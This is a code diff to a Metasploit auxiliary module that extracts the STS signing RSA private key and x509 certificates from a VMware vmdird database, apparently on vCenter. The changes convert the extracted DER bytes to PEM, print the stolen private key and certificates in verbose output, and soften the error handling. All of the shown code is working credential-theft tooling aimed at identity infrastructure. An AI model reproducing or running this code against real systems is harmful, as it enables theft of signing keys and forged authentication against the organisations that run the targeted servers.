@@ -124,10 +124,9 @@ class MetasploitModule < Msf::Auxiliary
     unless (bytes = read_mdb_sts_block(vmdir_file, datastore['MDB_CHUNK_SIZE'], datastore['MDB_STARTING_OFFSET']))
       fail_with(Msf::Exploit::Failure::NoTarget, "Invalid vmdird database '#{vmdir_file}': unable to locate TenantCredential-1 in binary stream")
     end
-    idp_certs = get_sts_pem(bytes)
     idp_key = get_sts_key(bytes)
     idp_key_pem = idp_key.to_pem.to_s
-    idp_certs.each do |stscert|
+    get_sts_pem(bytes).each do |stscert|
       idp_cert_pem = stscert.to_pem.to_s
       case stscert.check_private_key(idp_key)
       when true # Private key associates with public cert
@@ -167,7 +166,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def read_der(bytes)
     der_len = (bytes[2..3].unpack('H*').first.to_i(16) + 4).to_i
-    unless der_len <= bytes.length + 4
+    unless der_len <= bytes.length - 1
       fail_with(Msf::Exploit::Failure::Unknown, 'Malformed DER: byte length exceeds working buffer size')
     end
     bytes[0..der_len - 1]
@@ -176,9 +175,14 @@ class MetasploitModule < Msf::Auxiliary
   def get_sts_key(bytes)
     working_offset = bytes.unpack('H*').first.index(/3082[0-9a-f]{4}020100/) / 2 # PKCS1 magic bytes
     byte_len = bytes.length - working_offset
-    OpenSSL::PKey::RSA.new(read_der(bytes[working_offset, byte_len]))
+    key_bytes = read_der(bytes[working_offset, byte_len])
+    key_b64 = Base64.strict_encode64(key_bytes).scan(/.{1,64}/).join("\n")
+    key_pem = "-----BEGIN PRIVATE KEY-----\n#{key_b64}\n-----END PRIVATE KEY-----"
+    vprint_status("key_pem:\n#{key_pem}")
+    OpenSSL::PKey::RSA.new(key_pem)
   rescue OpenSSL::PKey::PKeyError
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of PKCS#1 RSA private key')
+    # fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of PKCS#1 RSA private key')
+    print_error('Failure during extract of PKCS#1 RSA private key')
   end
 
   def get_sts_pem(bytes)
@@ -186,10 +190,12 @@ class MetasploitModule < Msf::Auxiliary
     working_offset = bytes.unpack('H*').first.index(/3082[0-9a-f]{4}3082/) / 2 # x509v3 magic bytes
     byte_len = bytes.length - working_offset
     working_bytes = bytes[working_offset, byte_len]
-    offsets = [4, 8]
-    offsets.each do |offset|
+    [4, 8].each do |offset|
       der_bytes = read_der(working_bytes)
-      idp_certs << OpenSSL::X509::Certificate.new(der_bytes)
+      der_b64 = Base64.strict_encode64(der_bytes).scan(/.{1,64}/).join("\n")
+      der_pem = "-----BEGIN CERTIFICATE-----\n#{der_b64}\n-----END CERTIFICATE-----"
+      vprint_status("der_pem:\n#{der_pem}")
+      idp_certs << OpenSSL::X509::Certificate.new(der_pem)
       next_offset = working_offset + der_bytes.length + offset - 1
       working_offset = next_offset
       byte_len = bytes.length - working_offset
@@ -197,6 +203,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     idp_certs
   rescue OpenSSL::X509::CertificateError
-    fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of x509v3 certificate')
+    # fail_with(Msf::Exploit::Failure::NoTarget, 'Failure during extract of x509v3 certificate')
+    print_error('Failure during extract of x509v3 certificate')
   end
 end
